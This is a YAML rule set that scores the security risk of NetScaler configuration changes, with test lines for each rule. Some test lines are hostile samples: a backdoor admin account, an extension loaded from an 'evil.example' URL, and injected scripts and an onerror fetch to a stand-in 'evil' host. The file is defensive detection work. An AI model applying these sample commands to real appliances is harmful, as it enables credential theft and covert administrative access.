# Risk scoring for NetScaler config changes. Every changed line is checked against all rules,
# and the change takes the highest matching severity. Unmatched changes get `default_severity`.
#
# Match fields (all optional; every field given must match):
#   verbs:           CLI verbs (add, set, unset, bind, unbind, rm, enable, disable, ...)
#   objects:         exact objects, lower-case ("system user", "route")
#   object_prefixes: object starts with one of these ("audit ", "authentication ")
#   options:         at least one of these -options is present (case-insensitive)
#   line_regex:      regex (case-insensitive) on the redacted line
#   ops:             diff operation: added | removed | modified
# Each rule needs: id, severity (info|low|medium|high|critical), reason.
# tests: lines that must match the rule (checked by the test suite).

default_severity: low

rules:
  # Administrative identities and authorization.
  - id: mgmt-user
    objects: ["system user"]
    severity: critical
    reason: Management account created, changed or removed
    tests:
      - "add system user backdoor <redacted:1234abcd> -encrypted -hashmethod SHA512"
      - "set system user nsroot -allowedManagementInterface API"

  - id: mgmt-user-binding
    verbs: [bind, unbind]
    objects: ["system user"]
    severity: critical
    reason: Command policy bound to or removed from a management user
    tests:
      - "bind system user nr_sweep superuser 100"
      - "unbind system user auditor read-only 100"

  - id: mgmt-group-or-policy
    objects: ["system group", "system cmdpolicy", "system global"]
    severity: critical
    reason: Management group, command policy or global management auth binding changed
    tests:
      - "bind system group admins -policyName superuser 0"
      - "add system cmdPolicy allow_all ALLOW .*"
      - "bind system global ldap-pol 100"

  - id: unrestricted-cmd-policy
    objects: ["system cmdpolicy"]
    line_regex: '\bALLOW\b\s+(\.\*|".*\.\*.*"|q\{.*\.\*.*\})'
    severity: critical
    reason: Command policy grants unrestricted or wildcard administrative command access
    tests:
      - "add system cmdPolicy shell_all ALLOW .*"

  - id: management-auth-order
    verbs: [bind, unbind]
    objects: ["system global"]
    severity: critical
    reason: Global management authentication policy or priority changed
    tests:
      - "unbind system global radius-admin"

  - id: weak-management-password-policy
    objects: ["system parameter"]
    line_regex: '(-strongpassword\s+(disabled|no|off)|-minpasswordlen(gth)?\s+([0-7])\b|-passwordmin\s+([0-7])\b)'
    severity: critical
    reason: Management password strength requirements weakened
    tests:
      - "set system parameter -strongpassword disabled"
      - "set system parameter -minpasswordlen 6"

  # Authentication, AAA, SAML, OAuth and Gateway sessions.
  - id: authentication
    object_prefixes: ["authentication ", "aaa ", "tm "]
    severity: high
    reason: Authentication, AAA or traffic-management session configuration changed
    tests:
      - "add authentication samlIdPProfile idp1 -samlSPCertName sp"
      - "set aaa parameter -maxAAAUsers 5000"

  - id: authentication-policy-binding
    verbs: [bind, unbind]
    object_prefixes: ["authentication ", "aaa ", "vpn ", "lb ", "cs "]
    line_regex: '\b(authentication|authn|saml|oauth|ldap|radius|tacacs)'
    severity: high
    reason: Authentication policy binding or evaluation order changed
    tests:
      - "bind vpn vserver gateway_vs -policy ldap-pol -priority 100"
      - "unbind authentication vserver admin-auth -policy saml-pol"

  - id: saml-oauth-trust
    object_prefixes: ["authentication saml", "authentication oauth"]
    severity: critical
    reason: Federated identity trust, signing certificate or OAuth endpoint changed
    tests:
      - "set authentication samlIdPProfile idp1 -samlSPCertName new-sp-cert"
      - "add authentication OAuthAction oidc -authorizationEndpoint https://idp.example/authorize"

  - id: authentication-bypass
    object_prefixes: ["authentication ", "aaa ", "vpn "]
    line_regex: '(-authentication\s+(off|disabled)|-authn?401\s+(off|disabled)|-sso\s+(off|disabled)|-defaultauthenticationgroup\s+(none|""|''''))'
    severity: critical
    reason: Authentication, SSO or default authorization controls disabled or bypassed
    tests:
      - "set vpn vserver gateway_vs -authentication OFF"

  - id: external-auth-url
    object_prefixes: ["authentication ", "aaa ", "vpn "]
    line_regex: 'https?://'
    severity: high
    reason: Authentication or Gateway configuration references an external URL
    tests:
      - "set authentication OAuthAction oidc -tokenEndpoint https://idp.example/token"

  - id: gateway-session
    object_prefixes: ["vpn "]
    severity: medium
    reason: Gateway (VPN) configuration changed
    tests:
      - "add vpn sessionAction sa1 -clientlessVpnMode ON"

  - id: gateway-global
    objects: ["vpn parameter", "vpn global"]
    severity: high
    reason: Global Gateway settings changed
    tests:
      - "set vpn parameter -clientlessVpnMode ON"

  # Executable extensions and response/request manipulation.
  - id: ns-extension
    object_prefixes: ["ns extension"]
    severity: critical
    reason: NetScaler extension (Lua code on the packet engine) added or changed
    tests:
      - "import ns extension http://x/ext.lua ext1"
      - "add ns extension ext_local -src /var/tmp/ext.lua"

  - id: external-extension-source
    object_prefixes: ["ns extension"]
    line_regex: '(https?|ftp)://'
    severity: critical
    reason: Executable NetScaler extension is loaded from an external URL
    tests:
      - "import ns extension https://evil.example/ext.lua ext1"

  - id: page-injection
    objects: ["rewrite action", "responder action", "rewrite policy", "responder policy"]
    line_regex: '(<script|javascript:|data:text/html|\.js\b|document\.|eval\(|atob\(|fromCharCode|on(load|error|click)=|\bfetch\(|XMLHttpRequest|localStorage|sessionStorage)'
    severity: critical
    reason: Rewrite/responder content injects script or browser-executable content
    tests:
      - 'add rewrite action rw_x insert_before "HTTP.RES.BODY(1000).BEFORE_STR(\"</head>\")" q{"<script src=https://evil/x.js></script>"}'
      - 'add responder action steal respondwith q{"<img src=x onerror=fetch(\"https://evil/x\")>"}'

  - id: external-redirect
    objects: ["rewrite action", "responder action"]
    line_regex: '\bredirect\b.*(https?|ftp)://'
    severity: high
    reason: Rewrite or responder action redirects clients to an external URL
    tests:
      - "add responder action offsite redirect '\"https://external.example/login\"'"

  - id: unsafe-rewrite-bypass
    objects: ["rewrite action"]
    line_regex: '-bypasssafetycheck\s+(yes|on|enabled)'
    severity: high
    reason: Rewrite action bypasses built-in expression safety checks
    tests:
      - 'add rewrite action inject insert_before "HTTP.RES.BODY(100)" q{"banner"} -bypassSafetyCheck YES'

  - id: rewrite-responder
    object_prefixes: ["rewrite ", "responder "]
    severity: medium
    reason: Rewrite/responder configuration changed; review content and destinations
    tests:
      - "add responder action ra1 redirect '\"https://portal.example\"'"

  # Audit, syslog and monitoring visibility.
  - id: logging-disabled
    object_prefixes: ["audit "]
    line_regex: '(^\s*(rm|unbind|disable)\s+|-(loglevel|auditlog|syslog|nslog)\s+(none|off|disabled)\b)'
    severity: critical
    reason: Audit logging destination, binding or event coverage removed or disabled
    tests:
      - "unbind audit syslogGlobal -policyName nr_syslog_pol"
      - "set audit syslogParams -logLevel NONE"

  - id: logging-filter-weakened
    object_prefixes: ["audit "]
    line_regex: '(-loglevel\s+(emergency|alert|critical|error)\b|-(userdefinedauditlog|appflowexport|lsnlogging)\s+(no|off|disabled)\b)'
    severity: high
    reason: Audit event coverage or exported logging detail reduced
    tests:
      - "set audit syslogParams -logLevel ERROR"

  - id: logging-destination
    objects: ["audit syslogaction", "audit nslogaction"]
    severity: high
    reason: Audit log destination, transport or source configuration changed
    tests:
      - "set audit syslogAction nr_syslog -serverIP 10.0.0.51 -transport TCP"

  - id: insecure-syslog-transport
    objects: ["audit syslogaction"]
    line_regex: '-transport\s+udp\b'
    severity: high
    reason: Syslog transport changed to unauthenticated, lossy UDP
    tests:
      - "set audit syslogAction nr_syslog -transport UDP"

  - id: logging-tamper
    object_prefixes: ["audit "]
    severity: high
    reason: Audit, syslog or nslog configuration changed
    tests:
      - "rm audit syslogAction nr_syslog"

  # Management listeners, ACLs and network-plane reachability.
  - id: unsafe-management-service
    objects: ["ns ip", "ns ip6"]
    line_regex: '(-(telnet|ftp)\s+(enabled|yes|on)\b|-restrictaccess\s+(disabled|no|off)\b)'
    severity: critical
    reason: Insecure management service enabled or management access restrictions disabled
    tests:
      - "set ns ip 10.1.1.5 -telnet ENABLED"
      - "set ns ip 10.1.1.5 -restrictAccess DISABLED"

  - id: management-interface-expanded
    objects: ["system user"]
    line_regex: '-allowedmanagementinterface\s+.*\b(gui|cli|ssh|api)\b'
    severity: critical
    reason: Management account interface access changed or expanded
    tests:
      - "set system user automation -allowedManagementInterface GUI CLI API"

  - id: mgmt-access
    objects: ["ns ip", "ns ip6"]
    options: [mgmtAccess, restrictAccess, gui, ssh, telnet, ftp, snmp]
    severity: high
    reason: Management access exposure on an appliance IP changed
    tests:
      - "set ns ip 10.1.1.5 -mgmtAccess ENABLED"

  - id: any-source-management-acl
    objects: ["ns acl", "ns simpleacl", "ns acl6", "ns simpleacl6"]
    line_regex: '\bALLOW\b.*(0\.0\.0\.0([ /-]+(0|0\.0\.0\.0|255\.255\.255\.255))?|::(/0)?|\bany\b)'
    severity: critical
    reason: ACL allows traffic from any source and may expose management services
    tests:
      - "add ns acl allow_any ALLOW -srcIP 0.0.0.0-255.255.255.255"
      - "add ns acl6 allow_v6_any ALLOW -srcIPv6 ::/0"

  - id: mgmt-acl
    object_prefixes: ["ns acl", "ns simpleacl"]
    severity: high
    reason: Management or network ACL changed
    tests:
      - "add ns simpleACL admin_net ALLOW -srcIP 10.20.0.0 -destPort 443"

  - id: security-feature-off
    verbs: [disable, rm, unbind]
    object_prefixes: ["ns feature", "ns mode", "appfw ", "bot ", "ns acl"]
    severity: high
    reason: Security feature or protection removed or disabled
    tests:
      - "disable ns feature AppFw"

  # Certificates, private keys and transport security.
  - id: private-key-change
    objects: ["ssl certkey"]
    options: [key, password, passplain, inform, fipsKey]
    severity: high
    reason: Private key material, password or key-provider reference changed
    tests:
      - "set ssl certKey gateway -key new-gateway.key -password <redacted:abcd1234>"

  - id: external-certificate-source
    object_prefixes: ["ssl certkey", "ssl certfile", "ssl crl"]
    line_regex: '(https?|ftp)://'
    severity: critical
    reason: Certificate, key or revocation data is loaded from an external URL
    tests:
      - "add ssl certKey remote -cert https://external.example/cert.pem -key remote.key"

  - id: certificates
    object_prefixes: ["ssl certkey", "ssl certfile", "ssl crl", "ssl fipskey", "ssl hsmkey"]
    severity: medium
    reason: Certificate, key, CRL or hardware-backed key configuration changed
    tests:
      - "add ssl certKey new_ck -cert new.crt -key new.key"

  - id: obsolete-tls-enabled
    objects: ["ssl vserver", "ssl service", "ssl profile", "ssl parameter"]
    line_regex: '(-(ssl2|ssl3|tls1|tls11)\s+(enabled|yes|on)\b|-minprotocolver\s+(ssl(v?2|v?3)|tls1(\.0)?|tlsv1(\.0)?)(?=\s|$))'
    severity: critical
    reason: Obsolete SSL or TLS protocol version enabled
    tests:
      - "set ssl vserver gateway_vs -ssl3 ENABLED"
      - "set ssl profile frontend -minProtocolVer TLS1.0"

  - id: tls-modern-protocol-disabled
    objects: ["ssl vserver", "ssl service", "ssl profile", "ssl parameter"]
    line_regex: '-tls1(2|3)\s+(disabled|no|off)\b'
    severity: high
    reason: Modern TLS protocol version disabled
    tests:
      - "set ssl profile frontend -tls12 DISABLED"

  - id: weak-cipher-binding
    verbs: [bind]
    objects: ["ssl vserver", "ssl service", "ssl profile", "ssl cipher"]
    line_regex: '\b(RC4|DES|3DES|EXPORT|NULL|MD5|ADH|AECDH|LOW)\b'
    severity: critical
    reason: Weak, export-grade, anonymous or null cipher suite enabled
    tests:
      - "bind ssl vserver gateway_vs -cipherName RC4-MD5"

  - id: tls-binding
    objects: ["ssl vserver", "ssl service", "ssl profile", "ssl parameter", "ssl cipher"]
    severity: medium
    reason: TLS certificate binding, cipher group, profile or global parameter changed
    tests:
      - "bind ssl vserver gw_vs -certkeyName new_ck"

  # Core system, name/time services, routing and availability.
  - id: sensitive-system-parameters
    objects: ["ns encryptionparams", "ns rpcnode", "ns config"]
    severity: critical
    reason: Encryption keys, internode credentials or appliance management addressing changed
    tests:
      - "set ns rpcNode 10.0.0.10****** -encrypted"
      - "set ns encryptionParams -method AES256"

  - id: system-parameters
    objects: ["system parameter", "ns param"]
    severity: high
    reason: System-level management or runtime parameter changed
    tests:
      - "set ns param -cookieversion 1"

  - id: ntp-auth-disabled
    object_prefixes: ["ntp "]
    line_regex: '(-authentication\s+(disabled|no|off)\b|-autokeylogsec\s+0\b)'
    severity: high
    reason: NTP authentication or source validation weakened
    tests:
      - "set ntp param -authentication DISABLED"

  - id: time
    object_prefixes: ["ntp "]
    severity: medium
    reason: Time source or synchronization configuration changed
    tests:
      - "add ntp server 203.0.113.9"

  - id: dns
    object_prefixes: ["dns "]
    severity: medium
    reason: DNS resolver, zone, record or name-server configuration changed
    tests:
      - "add dns nameServer 203.0.113.53"

  - id: dns-recursion-exposed
    object_prefixes: ["dns "]
    line_regex: '-recursion\s+(enabled|yes|on)\b'
    severity: high
    reason: DNS recursion enabled and may expose the appliance as a resolver
    tests:
      - "set dns parameter -recursion ENABLED"

  - id: ha-critical-operation
    object_prefixes: ["ha "]
    line_regex: '(^\s*(disable|rm)\s+|-(hastatus|state|hamonitor)\s+(disabled|no|off)\b|-forc(e|ed)\b)'
    severity: critical
    reason: High availability disabled, forced or stripped of monitoring
    tests:
      - "disable HA node 1"
      - "set HA node 1 -haMonitor DISABLED"

  - id: ha
    object_prefixes: ["ha "]
    severity: high
    reason: High availability node, synchronization or failover configuration changed
    tests:
      - "add HA node 1 10.0.0.11"

  - id: routing
    objects: ["route", "route6", "ns ip", "ns ip6", "vlan", "netprofile", "rnat", "pbr"]
    severity: medium
    reason: Routing, addressing, NAT or policy-routing configuration changed
    tests:
      - "add route 0.0.0.0 0.0.0.0 10.9.9.9"

  - id: default-route-change
    objects: ["route", "route6"]
    line_regex: '^\s*(add|set|rm)\s+route6?\s+(0\.0\.0\.0\s+(0\.0\.0\.0|0)|::\s+0|::/0)'
    severity: high
    reason: Default route changed, altering appliance egress and management reachability
    tests:
      - "add route 0.0.0.0 0.0.0.0 10.9.9.9"

  - id: snmp
    object_prefixes: ["snmp "]
    severity: medium
    reason: SNMP community, user, manager or trap configuration changed
    tests:
      - "add snmp community <redacted:abcd1234> ALL"

  - id: unsafe-plaintext-protocol
    line_regex: '\b(ftp|tftp|telnet|http)://'
    severity: high
    reason: Configuration references an unencrypted external protocol
    tests:
      - "add responder action legacy redirect '\"http://legacy.example/login\"'"
